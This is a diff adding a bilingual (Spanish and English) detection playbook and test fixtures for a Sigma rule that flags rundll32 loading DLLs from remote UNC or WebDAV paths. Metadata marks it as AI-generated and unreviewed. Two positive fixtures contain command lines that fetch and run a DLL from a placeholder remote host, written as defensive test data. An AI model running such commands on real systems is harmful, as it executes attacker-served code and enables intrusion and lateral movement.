@@ -1,0 +1,139 @@
+{
+  "rule": {
+    "id": "5cdb711b-5740-4fb2-ba88-f7945027afac",
+    "title": "Rundll32 UNC Path Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_rundll32_unc_path.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_rundll32_unc_path.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1021.002",
+      "T1218.011"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó rundll32.exe con un argumento que empieza por una ruta UNC (\\\\servidor\\recurso), es decir, se cargó una DLL desde un recurso compartido remoto. Es una técnica habitual para ejecutar código sin copiarlo antes al disco local.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\rundll32.exe, OriginalFileName es RUNDLL32.EXE o CommandLine contiene 'rundll32', y CommandLine contiene una ruta UNC precedida por un espacio o una comilla. Se excluyen las líneas de comandos que hacen referencia a named pipes (\\\\.\\pipe).",
+      "why_it_matters": "Rundll32 es un binario firmado por Microsoft que sirve como proxy para ejecutar DLL maliciosas (T1218.011) y evadir controles. Cargar la DLL desde un recurso SMB (T1021.002) permite entregar el payload desde un servidor del atacante o moverse lateralmente.",
+      "triage_steps": [
+        "Revise CommandLine: identifique el host o IP de la ruta UNC, el recurso compartido, el nombre de la DLL y el punto de entrada exportado (después de la coma).",
+        "Determine si el servidor UNC es un file server interno conocido o un host externo o inusual, por ejemplo una IP pública o un servidor WebDAV.",
+        "Analice ParentImage y la línea de comandos del padre: Office, navegadores, explorer.exe tras abrir un LNK, mshta, wscript o cmd son señales de alerta.",
+        "Verifique el usuario y si ese usuario ejecuta normalmente software desde recursos compartidos en ese host.",
+        "Busque en el mismo host, +/- 15 minutos, conexiones SMB (445) o WebDAV salientes, procesos hijos de rundll32 y archivos creados.",
+        "Si puede acceder al recurso, obtenga el hash de la DLL y consúltelo en su plataforma de threat intelligence sin ejecutarla.",
+        "Pivote por la ruta UNC y el hash en otros endpoints y revise alertas previas del mismo host y usuario."
+      ],
+      "false_positives": [
+        "La regla indica que los falsos positivos son poco probables.",
+        "Scripts de inicio de sesión o herramientas de despliegue internas que invocan DLL desde un recurso compartido corporativo documentado.",
+        "Software heredado de un proveedor instalado o ejecutado directamente desde un file server interno."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del sistema o el equipo de TI si la ejecución desde ese recurso está autorizada y documentada.",
+        "Si no es legítima, aísle el endpoint y bloquee el host o IP del servidor UNC en firewall y proxy, incluido el tráfico SMB/WebDAV saliente.",
+        "Preserve la DLL, la memoria del proceso y los eventos relevantes antes de cualquier limpieza.",
+        "Elimine mecanismos de persistencia creados por el proceso y restablezca las credenciales del usuario afectado si hubo exposición.",
+        "Busque la misma ruta UNC y el mismo hash en todo el entorno y documente los indicadores."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque cargar DLL remotas con rundll32 rara vez es legítimo y suele indicar ejecución de payloads o movimiento lateral."
+    },
+    "en": {
+      "summary": "rundll32.exe was launched with an argument that starts with a UNC path (\\\\server\\share), so it loaded a DLL from a remote share. Attackers commonly use this to run code without first copying it to the local disk.",
+      "what_it_detects": "Windows process creation events where Image ends with \\rundll32.exe, OriginalFileName is RUNDLL32.EXE, or CommandLine contains 'rundll32', and CommandLine also contains a UNC path preceded by a space or quote. Command lines that reference named pipes (\\\\.\\pipe) are excluded.",
+      "why_it_matters": "Rundll32 is a Microsoft-signed binary that can proxy the execution of malicious DLLs and slip past controls (T1218.011). Loading the DLL over SMB (T1021.002) lets an attacker serve the payload from their own server or move laterally.",
+      "triage_steps": [
+        "Read CommandLine. Note the UNC host or IP, the share, the DLL name and the exported entry point after the comma.",
+        "Decide whether the UNC server is a known internal file server or an unusual or external host, such as a public IP or a WebDAV server.",
+        "Review ParentImage and the parent's command line. Office, browsers, explorer.exe after a LNK was opened, mshta, wscript or cmd are red flags.",
+        "Check the user and whether that user normally runs software from network shares on this host.",
+        "On the same host within +/- 15 minutes, look for outbound SMB (445) or WebDAV connections, rundll32 child processes and new files.",
+        "If the share is reachable, get the DLL hash and look it up in threat intelligence. Do not execute the DLL.",
+        "Search for the UNC path and hash on other endpoints, and review earlier alerts for the same host and user."
+      ],
+      "false_positives": [
+        "The rule rates false positives as unlikely.",
+        "Logon scripts or internal deployment tools that call DLLs from a documented corporate share.",
+        "Legacy vendor software that is installed on or runs directly from an internal file server."
+      ],
+      "response_steps": [
+        "Ask the system owner or IT whether running code from that share is authorized and documented.",
+        "If it is not legitimate, isolate the endpoint and block the UNC host or IP at the firewall and proxy, including outbound SMB and WebDAV.",
+        "Preserve the DLL, process memory and relevant events before you clean anything up.",
+        "Remove any persistence the process created. Reset the user's credentials if they may have been exposed.",
+        "Search the whole environment for the same UNC path and hash, and record the indicators."
+      ],
+      "severity_rationale": "High fits because rundll32 loading a remote DLL is rarely legitimate and usually means payload execution or lateral movement."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "rundll32 loads a DLL from an unquoted UNC path on a remote IP, spawned by explorer.exe after a LNK was opened",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "CommandLine": "rundll32.exe \\\\198.51.100.20\\share\\update.dll,DllRegisterServer",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "CurrentDirectory": "C:\\Users\\jperez\\Downloads\\"
+        }
+      },
+      {
+        "description": "rundll32 loads a DLL from a quoted UNC path on an external host, launched by cmd.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\rundll32.exe\" \"\\\\files.example.org@SSL\\DavWWWRoot\\pub\\helper.dll\",Start",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start rundll32",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate rundll32 call to a local system DLL to open a Control Panel applet. There is no UNC path.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      },
+      {
+        "description": "rundll32 runs a local vendor DLL and passes a named pipe argument. The \\\\.\\pipe filter excludes it.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "CommandLine": "rundll32.exe C:\\ProgramData\\VendorAgent\\agent.dll,Connect \\\\.\\pipe\\vendor_agent",
+          "ParentImage": "C:\\Program Files\\VendorAgent\\agentsvc.exe",
+          "CurrentDirectory": "C:\\ProgramData\\VendorAgent\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
